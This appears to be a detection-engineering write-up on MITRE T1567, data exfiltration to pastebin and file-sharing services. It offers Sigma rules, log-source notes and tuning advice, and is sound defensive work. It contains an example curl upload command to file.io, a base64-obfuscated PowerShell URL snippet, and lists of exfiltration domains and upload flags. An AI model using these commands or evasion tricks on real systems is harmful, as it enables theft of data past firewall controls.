### **1. Technique Breakdown: T1567**

* **What it is:** **Exfiltration Over Web Service**. Adversaries exfiltrate stolen data by posting it to public web services (such as pastebins, temporary file-sharing portals, or API endpoints of online utilities) rather than standard cloud storage. They configure scripting engines (like PowerShell) or file-transfer binaries (like `curl.exe`) to execute HTTP POST requests targeting these services. Since these web services are legitimate, their outbound traffic is often allowed through corporate firewalls.
* **Log Source Requirements:** Sysmon Network Connection logs (Event ID 3) and Process Creation logs (Event ID 1) capturing web request parameters.
* **Coverage Check:**
    * **HIDS (Sysmon + Wazuh): YES.** Sysmon Event ID 3 logs the destination hostname of network sockets initiated by scripting utilities. Event ID 1 captures command line details (e.g. `curl -F "file=@data.zip" https://file.io`).
    * **NIDS (Suricata + Zeek): YES.** Network monitoring records SSL SNI negotiations or HTTP requests to public paste/file sharing domains.

### **2. Custom Sigma Rule**

This rule utilizes **Sysmon Event ID 3 (Network Connection)** and **Event ID 1 (Process Creation)** to detect scripting engines or command-line utilities (like PowerShell, cmd, curl) initiating connections or executing commands targeting known public file-sharing and pastebin web services.

```yaml
title: Exfiltration - Data Upload to Public Web Service (AN1511)
id: 4dc4c888-7aee-4709-b9a5-25988a1721c2
status: experimental
description: Detects command-line interpreters or file transfer tools initiating network connections or sending HTTP requests to known pastebin or temporary file-sharing web services, which may indicate data exfiltration.
author: Krishna Gupta
date: 2026-06-08
logsource:
    category: network_connection
    product: windows
    # Relies on Sysmon Event ID 3/Event ID 1 collected via Wazuh
detection:
    selection_process:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\curl.exe'
            - '\wscript.exe'
            - '\cscript.exe'
    selection_domains:
        DestinationHostname|contains:
            - 'pastebin.com'
            - 'paste.ee'
            - 'hastebin.com'
            - 'file.io'
            - 'gofile.io'
            - 'sendspace.com'
            - 'anonfiles.com'
            - 'transfer.sh'
            - 'mega.nz'
            - 'temp.sh'
        CommandLine|contains:
            - 'pastebin'
            - 'file.io'
            - 'gofile'
            - 'transfer.sh'
            - ' -F ' # curl form-data upload flag
            - ' -d ' # curl post data flag
            - 'UploadFile'
            - 'PostAsync'
    condition: selection_process and selection_domains
fields:
    - CommandLine
    - DestinationHostname
    - Image
falsepositives:
    - Developers using curl or PowerShell to share debugging logs or build outputs on public paste bins.
    - Automated system status monitoring scripts configured to post status details to external developer dashboards.
level: high
tags:
    - attack.exfiltration
    - attack.t1567
    - analytics.an1511
    - detection.det0548
```

### OCSF Normalized
```xml
title: Exfiltration - Data Upload to Public Web Service (OCSF-Normalized)
id: 4dc4c888-7aee-4709-b9a5-25988a1721c2
status: experimental
description: Detects scripting hosts initiating network connections to public file-sharing or pastebin domains, mapped to OCSF network_activity.
author: Krishna Gupta
date: 2026-06-08
logsource:
    category: system
    product: ocsf
    class: network_activity
detection:
    # Based on OCSF mapping, process path is process.file.path and destination is activity.http_request.host
    selection_process:
        process.file.path|endswith:
            - '\powershell.exe'
            - '\cmd.exe'
            - '\curl.exe'
    selection_domains:
        activity.http_request.host|contains:
            - 'pastebin.com'
            - 'file.io'
            - 'gofile.io'
            - 'transfer.sh'
            - 'mega.nz'
        process.cmd_line|contains:
            - 'UploadFile'
            - ' -F '
            - ' -d '
    condition: selection_process and selection_domains
fields:
    - activity.http_request.host
    - process.cmd_line
    - process.file.path
falsepositives:
    - Authorized admin uploads of script diagnostics.
level: high
tags:
    - attack.exfiltration
    - attack.t1567
```

### **3. Blind Spots & Tuning (The "Problems")**

* **Problem 1: Use of custom API gateways**
    * *The Issue:* Attackers can route their exfiltration traffic through a custom API gateway (e.g. AWS API Gateway, Cloudflare Workers) which acts as a reverse proxy, meaning the destination hostname will be a legitimate cloud platform domain rather than a known file-sharing site.
    * *The Fix:* Complement this rule with detections that baseline normal outbound connections from scripting engines and flag connection setups that violate the established system baseline.

* **Problem 2: Base64/Obfuscated Domain Strings**
    * *The Issue:* In PowerShell scripts, attackers can base64-encode the target URL (e.g., `[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9maWxlLmlv'))`), rendering static command-line string matching blind.
    * *The Fix:* Enable Script Block Logging (Event ID 4104) and look for base64 decode routines combined with Net.WebClient or HttpClient classes.

* **Problem 3: Standard developer usage of Pastebin / Gofile**
    * *The Issue:* Software engineers legitimately use paste bins to share script files, generating heavy false positive alerting.
    * *The Fix:* Create static exclusions allowing verified developer workstations or specific developer user accounts, and limit alerting to execution from production servers.
